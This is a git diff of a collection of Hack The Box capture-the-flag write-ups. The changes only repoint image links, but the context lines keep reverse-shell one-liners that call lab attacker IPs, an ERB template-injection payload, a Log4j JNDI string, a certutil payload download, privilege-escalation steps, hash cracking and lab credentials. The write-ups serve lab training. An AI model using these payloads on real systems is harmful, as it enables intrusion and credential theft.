@@ -236,7 +236,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
 
 `nmap -sVC 10.10.11.224`
 
-<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
 
 * 22 SSH
 * 80 HTTP (filtered)
@@ -247,9 +247,9 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
 * by results of nmap scan: -p 55555 is open
 * lets check the URL: http://10.10.11.224:55555
 
-<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption><p>Website on port 55555</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption><p>Website on port 55555</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption><p>Footer of the website</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption><p>Footer of the website</p></figcaption></figure>
 
 ### Weaponisation
 
@@ -263,13 +263,13 @@ request-baskets v 1.2.1
 
 #### Create a basket
 
-<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption><p>new basket "test"</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption><p>new basket "test"</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption><p>header - Configuration Settings</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption><p>header - Configuration Settings</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption><p>Configuration according the the exploit</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption><p>Configuration according the the exploit</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption><p>Service running on -p80 is MAILTRAIL v0.53</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption><p>Service running on -p80 is MAILTRAIL v0.53</p></figcaption></figure>
 
 * Mailtrail v0.53 VULN
   * lets find a vuln to prepare a PoC (proof-of-concept)
@@ -311,9 +311,9 @@ print("\n\[+]Exploiting MailTrail on {}".format(str(TARGET\_URL))) try: exploit(
 
 `python3 exploit.py 10.10.14.7 4444 http://10.10.11.224:55555/test`
 
-<figure><img src=".gitbook/assets/image (40).png" alt=""><figcaption><p>Reverse Shell obtained</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption><p>Reverse Shell obtained</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption><p>Path to user flag (/home/puma/user.txt)</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption><p>Path to user flag (/home/puma/user.txt)</p></figcaption></figure>
 
 ### Root flag
 
@@ -321,7 +321,7 @@ print("\n\[+]Exploiting MailTrail on {}".format(str(TARGET\_URL))) try: exploit(
 
 `sudo -l`
 
-<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption><p>systemctl status trail.service</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption><p>systemctl status trail.service</p></figcaption></figure>
 
 * run the possible command
 
@@ -329,13 +329,13 @@ print("\n\[+]Exploiting MailTrail on {}".format(str(TARGET\_URL))) try: exploit(
 
 `!sh`
 
-<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
 
 `cd /root`
 
 `cat root.txt`
 
-<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
 ## Keeper
 
@@ -482,12 +482,12 @@ else:
   * 22 SSH
   * 80 HTTP
 
-<figure><img src=".gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
 
 * add to hosts
   * `sudo nano /etc/hosts`
 
-<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
 
 * dirb
   * `dirb http://devvortex.htb/ /usr/share/wordlists/dirb/common.txt`
@@ -497,7 +497,7 @@ else:
 
       * found **dev**.devvortex.htb
 
-      <figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
   * another bruteforce tool
   * `ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -mc 200-299`
 
@@ -512,7 +512,7 @@ else:
 
 * robots.txt
 
-<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
 
 ### Weaponisation
 
@@ -522,7 +522,7 @@ else:
 
     * running Joomla
 
-    <figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -534,14 +534,14 @@ else:
     * admin page /administrator
     * **Joomla 4.2.6**
 
-    <figure><img src=".gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
 * Joomla 4.2.6
   * **CVE-2023-23752**
 
-<figure><img src=".gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
 
 *   [Exploit](https://github.com/Acceis/exploit-CVE-2023-23752)
 
@@ -553,7 +553,7 @@ else:
     * ruby exploit.rb http://dev.devvortex.htb
       * found users & DB credentials
 
-    <figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -562,7 +562,7 @@ else:
 * login w creds
   * lewis:P4ntherg0t1n5r3c0n##
 
-<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
@@ -572,41 +572,41 @@ else:
 
     * **SYSTEM -> Templates -> Administrator Templates**
 
-    <figure><img src=".gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
 
 
 
     * error.php
 
-    <figure><img src=".gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
 
     * [Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
       *
 
-          <figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+          <figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
 
 
 
           * change IP & port to your own values
 
-<figure><img src=".gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
 
 * Save
 * Start netcat listener
   * `nc -nlvp 4444`
 
-<figure><img src=".gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
 
 * visit error.php&#x20;
   * [http://dev.devvortex.htb/administrator/templates/atum/error.php](http://dev.devvortex.htb/administrator/templates/atum/error.php)
   * BOOM, we have reverse shell
 
-<figure><img src=".gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
 
 * `python3 -c "import pty;pty.spawn('/bin/bash')"`
 * we dont have permissions to read user flag...
 
-<figure><img src=".gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
 
 * we have to login via SSH as logan, lets find the PW
   * `mysql -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##`
@@ -614,7 +614,7 @@ else:
     * sd4fg\_users table...
       * select \* from sd4fg\_users
 
-<figure><img src=".gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
 
 * users found:
   * lewis:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
@@ -626,20 +626,20 @@ else:
   * `hashcat -m 3200 hash.txt /home/zihuatanejo/Desktop/rockyou.txt`
     * PW found: **tequieromucho**
 
-<figure><img src=".gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
 * SSH login to logan
   * `ssh logan@10.10.11.242`
     * PW: tequieromucho
   * cat user.txt
 
-<figure><img src=".gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
 
 ### Root flag
 
 * `sudo -l`
 
-<figure><img src=".gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
 
 * we can run /usr/bin/apport.cli
 * apport-cli -v
@@ -652,7 +652,7 @@ else:
         sleep 13 & killall -SIGSEGV sleep
         ```
 
-<figure><img src=".gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
 
 * cd /var/crash
 * ls
@@ -663,7 +663,7 @@ else:
       * **`!/bin/bash`**
         * BOOM, we have root privileges
 
-    <figure><img src=".gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
 
 
 * cd /root&#x20;
@@ -681,7 +681,7 @@ else:
 
 `nmap -sVC 10.10.11.252`
 
-<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### **/etc/hosts**
 
@@ -689,7 +689,7 @@ else:
 
 `10.10.11.252 bizness.htb`
 
-<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### website
 
@@ -710,7 +710,7 @@ else:
 
 
 
-![](<.gitbook/assets/image (9) (1) (1) (1) (1).png>)\
+![](<../.gitbook/assets/image (9) (1) (1) (1) (1).png>)\
 
 
 ### Weaponisation
@@ -736,7 +736,7 @@ else:
 
 
 
-<figure><img src=".gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
@@ -749,7 +749,7 @@ else:
 
 `cat /etc/passwd`
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `cd /tmp`&#x20;
 
@@ -759,7 +759,7 @@ else:
 
 `cat AdminuserLoginData.xml`
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Obtained info:
 
@@ -775,7 +775,7 @@ requirePasswordChange="Y"
 
 {% embed url="https://hashes.com/en/tools/hash_identifier" %}
 
-<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 OK - it could be SHA1, but nothing valuable
 
@@ -793,7 +793,7 @@ OK - it could be SHA1, but nothing valuable
 
 **OK, some SHA is stored in c6650.dat file**
 
-<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `admin$"`**`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=`**
 
@@ -880,7 +880,7 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 `python3 hashcsript.py`
 
-<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `su root`
 
@@ -888,7 +888,7 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 `cat root.txt`
 
-<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Crafty
 
@@ -898,16 +898,16 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 * nmap -sVC \<IP>
 
-<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Website
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * sudo nano /etc/hosts
   * \<IP> crafty.htb
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * subpages
   * /coming-soon
@@ -919,7 +919,7 @@ Website
 
 *
 
-    <figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -930,7 +930,7 @@ Website
 * extended nmap for higher ports
 * `nmap -sVC 10.10.11.249 -p0-65535`
 
-<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * minecraft 1.16.5 Crafty server, Microsoft...
 
@@ -945,13 +945,13 @@ Minecraft Launcher
     * source env/bin/activate
     * pip install -r requirements.txt
 
-<figure><img src=".gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * install requirements manually (if there were problems)
   * JDK 8
     * `wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz`
 
-<figure><img src=".gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -962,21 +962,21 @@ Logj4
   * change line 26 -> String cmd="cmd.exe"
     * because we are to attack Windows machine, not Linux (bin/sh)
 
-<figure><img src=".gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * run exploit (poc.py)
   * we are getting error, so we should move the downloaded jdk1.8.0\_20 file to the folder (log4j-shell-poc)
   * \+ change name to **jdk1.8.0\_20**
 
-<figure><img src=".gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * run exploit again
   * successful
   * exploit: **`Send me: ${jndi:ldap://10.10.14.3:1389/a}`**
 
-<figure><img src=".gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
@@ -986,12 +986,12 @@ Logj4
     * Enter your password: \<none>
     * Enter server host or host:port: \<HTB machine IP>
 
-<figure><img src=".gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Enter the exploit
   * **`${jndi:ldap://10.10.14.3:1389/a}`**
 
-<figure><img src=".gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 * nc -nlvp 4444
   * we obtained reverse shell
@@ -999,7 +999,7 @@ Logj4
     * cd Desktop
     * type user.txt
 
-<figure><img src=".gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Root flag
 
@@ -1011,11 +1011,11 @@ Finding vulnerability for PE
 
 * cd server && dir
 
-<figure><img src=".gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
 
 * cd plugins && dir
 
-<figure><img src=".gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
 
 * there is sile playercounter-1.0-SNAPSHOT.jar file
   * get it to our machine
@@ -1040,7 +1040,7 @@ Finding vulnerability for PE
 * Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
   * F12 -> Network -> document
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Hosts
 
@@ -1060,7 +1060,7 @@ sudo nano /etc/hosts
     * get '/admin' do "Hello World" end
   * same output for any subpage it doesnt know
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -1072,15 +1072,15 @@ sudo nano /etc/hosts
       python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
       ```
 
-<figure><img src=".gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### BurpSuite
 
-<figure><img src=".gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * POST the calculator % send it to repeater
 
-<figure><img src=".gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 `category1=Test%0A<%25%3d+REVERSE SHELL+%25>`
 
@@ -1096,18 +1096,18 @@ category1=Test%0A<%25%3d+`python3+-c+'import+socket,subprocess,os%3bs%3dsocket.s
 
 * Run it in repeater to obtain the reverse shell on given port
 
-<figure><img src=".gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 
-<figure><img src=".gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Finding the susan´s PW
 
 Susan hash password in the /home/susan/Migration/pupilpath\_credentials.db  file\
 `strings /home/susan/Migration/pupilpath_credentials.db`
 
-<figure><img src=".gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 * USER: **Susan Miller**
 * HASH: `abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f`
@@ -1116,7 +1116,7 @@ The format of the password is in the /var/spool/mail/susan. You can crack it wit
 
 `hashcat -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d`
 
-<figure><img src=".gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### User Flag
 
@@ -1149,7 +1149,7 @@ The format of the password is in the /var/spool/mail/susan. You can crack it wit
 * 587 SMTP
 * 993 SSL/IMAP
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### hosts
 
@@ -1165,7 +1165,7 @@ The format of the password is in the /var/spool/mail/susan. You can crack it wit
 
 #### website
 
-<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 * "Powered by hMailServer"
   * opensource mail server for Win, AGLPv3 licence
@@ -1235,7 +1235,7 @@ WonderCMS
 * curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=\<ATTACKER\_IP>\&lport=\<ATTACKER\_PORT>'
   * we obtained the revshell
 
-<figure><img src=".gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
@@ -1350,7 +1350,7 @@ ssh amay@10.10.11.28
 * PW...
 * cat user.txt
 
-<figure><img src=".gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>
 
 ### Root flag
 
@@ -1386,9 +1386,9 @@ now we can access the URL: **localhost:8888**
 
 * and login with amay credentials
 
-<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * we accessed the SysMonitor under -p 8080
   * we can analyze the log files...
@@ -1399,16 +1399,16 @@ now we can access the URL: **localhost:8888**
 
 #### Burpsuite
 
-<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * we can modify the log file path...
   * /root/root.txt; cat root.txt
 
-<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Root flag obtained :-)
   * PWNED
@@ -1546,7 +1546,7 @@ Your default password is: Cicada$M6Corpb*@Lp#nZp!8
 
 
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 #### Using the default PW
 
@@ -1592,7 +1592,7 @@ SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrigh
 
 * Michael Wrightson is baddy, uses default creds...&#x20;
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Lateral Movement
 
@@ -1619,7 +1619,7 @@ SMB         10.10.11.35     445    CICADA-DC        emily.oscars                
     aRt$Lp#7t*VQ!3
     ```
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 * we have two users, lets check what right they have...
 
@@ -1673,7 +1673,7 @@ Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
 ```
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -1728,13 +1728,13 @@ Mode                 LastWriteTime         Length Name
 
 * just move to Desktop dir and type the user.txt file...
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Checking the goal subfolder where we wanna get inside
 
 * C:\Users\Administrator\Desktop\root.txt
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -1750,14 +1750,14 @@ Mode                 LastWriteTime         Length Name
 * (Evil-WinRM) certutil -urlcache -f http://10.10.14.60:9000/esc.ps1 esc.ps1
 *
 
-    <figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 * .  ./esc.ps1
 * Acl-FullControl -user cicada\emily.oscars -path C:\users\administrator\desktop
 
-<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 * now we can access admin folders...
   * cd C:\Users\Administrator\Desktop
@@ -1765,5 +1765,5 @@ Mode                 LastWriteTime         Length Name
   * type root.txt
     * \***ROOT\_FLAG**\*
 
-<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
